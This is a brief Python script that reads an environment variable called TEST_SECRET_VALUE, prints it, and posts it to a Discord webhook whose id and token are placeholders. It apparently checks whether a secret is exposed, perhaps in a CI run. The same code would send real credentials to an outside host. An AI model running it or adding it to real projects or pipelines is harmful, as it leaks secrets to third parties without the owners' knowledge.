import os
import requests

test_secret_value = os.getenv('TEST_SECRET_VALUE')
print(test_secret_value)
WEBHOOK_URL = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
if test_secret_value:
    print("Secret value exists")
    requests.post(WEBHOOK_URL, json={f"content": "Secret value found {test_secret_value}"})

